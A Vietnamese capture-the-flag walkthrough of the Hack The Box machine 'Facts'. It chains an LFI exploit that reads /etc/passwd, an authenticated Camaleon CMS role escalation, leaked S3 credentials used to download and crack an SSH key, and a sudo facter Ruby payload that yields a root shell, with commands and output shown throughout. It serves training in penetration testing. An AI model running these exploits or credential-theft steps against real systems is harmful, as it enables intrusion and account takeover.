# Facts

<figure><img src="../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>



Target : 10.129.206.116

## Recon

### Scan port

sau khi quét port thì tôi phát hiện thấy là có 2 port đang mở là 22 và 80 , và khi truy cập vào port 80 sẽ tự động redirect tới  `http://searcher.htb/`

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

<figure><img src="../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

### FUZZING



Và khi ta chuyển sang Fuzz directory thì ta thấy nó redirect về `/admin/login`

```
admin                (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
```

<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

## Exploit

sau khi tạo 1 tài khoản với quyền alf client thì ta có được 1 thông tin quan trọng về tên của CMS và version của nó , từ đây ta dễ dàng tìm kiếm được các CVE :&#x20;

```
CVE-2024-46987 : LFI
CVE-2025-2304  : leo quyền lên admin
```

<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

### &#x20;CVE-2024-46987

```bash
(base) ┌──(kali㉿kali)-[~/temp/CVE-2024-46987]
└─$ python3 CVE-2024-46987.py -u http://facts.htb -l botuoi -p botuoi123 /etc/passwd           
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```

từ đây ta có thể phỏng đoán flag user sẽ nằm ở  `/home/william` hoặc `/home/trivia`

```bash
(base) ┌──(kali㉿kali)-[~/temp/CVE-2024-46987]
└─$ python3 CVE-2024-46987.py -u http://facts.htb -l botuoi -p botuoi123 /home/william/user.txt
34d7e4xxxxxxxxxxxxxxxxxxxxxxxx
```

### CVE-2025-2304

Tiếp đến ta sẽ dùng CVE này để leo lên admin



```bash
└─$ python3 exploit.py -u http://facts.htb -U botuoi -P botuoi123
[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+]Login confirmed
   User ID: 6
   Current User Role: client
[+]Loading PPRIVILEGE ESCALATION
   User ID: 6
   Updated User Role: admin
[+]Reverting User Role            
```

sau khi lên được admin thì ta sẽ có 1 số thông tin như sau ở `http://facts.htb/admin/settings/site`

```bash
AWS key

Save files in aws s3

Aws s3 access key (*)
AKIA8F414EDD884C79C4
Aws s3 secret key (*)
YdnSDpv6PcFEvd/v5PBuLYc1qBnjiBUnvvHLSsVs
Aws s3 bucket name (*)
randomfacts
Aws s3 region (*)
us-east-1
Aws s3 bucket endpoint
http://localhost:54321
```

Từ đây có thể connect tới server aws s3 để lấy các file quan trọng như id\_rsa

Config trước khi kết nối :&#x20;

```bash
(base) ┌──(kali㉿kali)-[~/temp/CVE-2025-2304]
└─$ aws configure  --profile facts
AWS Access Key ID [None]: AKIA8F414EDD884C79C4
AWS Secret Access Key [None]: YdnSDpv6PcFEvd/v5PBuLYc1qBnjiBUnvvHLSsVs
Default region name [None]: us-east-1
Default output format [None]: json
                                      
```



```bash
(base) ┌──(kali㉿kali)-[~/temp/CVE-2025-2304]
└─$ aws --profile facts --endpoint-url http://facts.htb:54321 s3 ls s3://internal/
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 13:45:13        220 .bash_logout
2026-01-08 13:45:13       3900 .bashrc
2026-01-08 13:47:17         20 .lesshst
2026-01-08 13:47:17        807 .profile
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
(base) ┌──(kali㉿kali)-[~/temp/CVE-2025-2304]
└─$ aws --profile facts --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/
2026-04-24 09:57:31         82 authorized_keys
2026-04-24 09:57:31        464 id_ed25519
                                                                                                                                                                                                                                            
(base) ┌──(kali㉿kali)-[~/temp/CVE-2025-2304]
└─$ aws --profile facts --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
download: s3://internal/.ssh/id_ed25519 to ./id_ed25519    
```

Ở bước này, sau khi tải được file private key `id_ed25519` từ S3 nội bộ, ta tiến hành kiểm tra xem key này có được bảo vệ bằng passphrase hay không và nếu có thì cần tiến hành crack.

Trước hết, sử dụng script `ssh2john.py` để chuyển đổi private key sang định dạng hash mà John the Ripper có thể xử lý:

Script này sẽ trích xuất thông tin mã hóa của SSH key và chuyển thành dạng hash phù hợp cho quá trình brute-force.

Tiếp theo, dùng John the Ripper với wordlist (ở đây là `rockyou.txt`) để thử các mật khẩu phổ biến

```bash
(base) ┌──(kali㉿kali)-[~/temp/CVE-2025-2304]
└─$ python3 /usr/share/john/ssh2john.py id_ed25519 > key.hash
                                                                   
(base) ┌──(kali㉿kali)-[~/temp/CVE-2025-2304]
└─$ john key.hash --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 7 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (id_ed25519)     
1g 0:00:01:31 DONE (2026-04-24 11:28) 0.01094g/s 34.93p/s 34.93c/s 34.93C/s billy1..rusty1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Kết quả cho thấy:

* John nhận diện đây là SSH private key có mã hóa
* Quá trình brute-force sử dụng wordlist diễn ra với nhiều luồng (OpenMP threads)
* Cuối cùng tìm được passphrase là:

```
dragonballz
```

Tiếp theo ta sẽ di chuyển ngang sang dịch vụ SSH ở port 22 sau khi đã đầy đủ vũ khí&#x20;

```
ssh -i id_ed25519 trivia@facts.htb
```

và  passphrase = dragonballz

### &#x20;Privilege Escalation

Sau khi vào được tài khoản của trivia , tôi tiến hành recon để leo quyền

```bash
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

ở đây ta thấy có 1 lệnh được chạy dưới quyền sudo nopasswd là `/usr/bin/facter`

{% embed url="https://gtfobins.org/gtfobins/facter/" %}

### &#x20;/usr/bin/facter

Cụ thể, `facter` cho phép sử dụng tham số `--custom-dir` để load các file Ruby. Nếu ta kiểm soát được nội dung file này, có thể chèn mã độc để thực thi lệnh hệ thống.

Tiến hành tạo một file Ruby độc hại:

```
echo 'Facter.add(:pwn) { setcode { system("/bin/bash") } }' > /tmp/pwn.rb
```

Giải thích:

* `Facter.add(:pwn)`: định nghĩa một custom fact
* `setcode`: đoạn code sẽ được thực thi khi fact được gọi
* `system("/bin/bash")`: thực thi shell với quyền của tiến trình (trong trường hợp này là root)

Sau đó, thực thi `facter` với quyền sudo và chỉ định thư mục chứa file độc hại:

```
sudo /usr/bin/facter pwn --custom-dir /tmp
```

Lệnh này sẽ load file `/tmp/pwn.rb`, kích hoạt đoạn code và spawn một shell với quyền root.

```bash
trivia@facts:~$ echo 'Facter.add(:pwn) { setcode { system("/bin/bash") } }' > /tmp/pwn.rb
trivia@facts:~$ sudo /usr/bin/facter pwn --custom-dir /tmp
root@facts:/home/trivia# cat /root/root.txt
718e5d8ecxxxxxxxxxxxxx
```

<figure><img src="../../.gitbook/assets/image (783).png" alt=""><figcaption></figcaption></figure>

